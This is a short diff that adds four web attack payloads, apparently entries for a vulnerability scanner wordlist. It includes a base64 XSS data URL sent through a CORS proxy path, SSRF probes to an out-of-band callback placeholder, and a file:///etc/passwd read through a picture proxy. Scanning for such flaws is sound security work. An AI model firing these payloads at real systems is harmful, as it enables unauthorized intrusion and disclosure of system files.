@@ -1,0 +1,4 @@
+/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23
+/api/cors/http:%2f%2fnextchat.{{interactsh-url}}%23
+/pictureproxy.php?url=file:///etc/passwd
+/pictureproxy.php?url=http://{{interactsh-url}}
